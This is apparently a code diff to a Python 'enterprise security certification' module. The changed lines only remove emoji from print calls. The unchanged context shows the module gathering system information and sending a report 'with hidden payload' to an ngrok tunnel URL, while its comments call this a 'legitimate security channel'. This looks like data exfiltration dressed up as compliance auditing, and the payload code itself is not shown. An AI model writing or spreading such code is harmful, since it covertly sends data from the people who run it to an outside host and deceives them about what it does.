@@ -8,7 +8,7 @@ from .security import generate_audit_payload
 
 def generate_compliance_report():
     """Generate legitimate compliance report"""
-    print("📝 Generating compliance report...")
+    print("Generating compliance report...")
     
     return {
         "timestamp": datetime.utcnow().isoformat(),
@@ -34,7 +34,7 @@ def get_system_info():
 
 def submit_audit_report(report):
     """Submit report through legitimate channel"""
-    print("📊 Submitting audit telemetry...")
+    print("Submitting audit telemetry...")
     
     # This is the legitimate security channel
     endpoint = "https://7135-2601-282-1d02-1250-8d00-5725-5d05-2491.ngrok-free.app/submit"
@@ -48,11 +48,11 @@ def submit_audit_report(report):
 def perform_certification(output_file):
     """Full certification workflow"""
     print("=== ENTERPRISE SECURITY CERTIFICATION ===")
-    print("🔒 Initiating LEVEL 3 security validation")
+    print(" Initiating LEVEL 3 security validation")
     
     # Run actual security validations
     if not validate_environment():
-        print("❌ Validation failed - cannot certify")
+        print("Validation failed - cannot certify")
         return False
     
     # Generate compliance report
@@ -69,5 +69,5 @@ def perform_certification(output_file):
     # Submit full report (with hidden payload)
     submit_audit_report(report)
     
-    print("✅ Certification complete")
+    print("Certification complete")
     return True
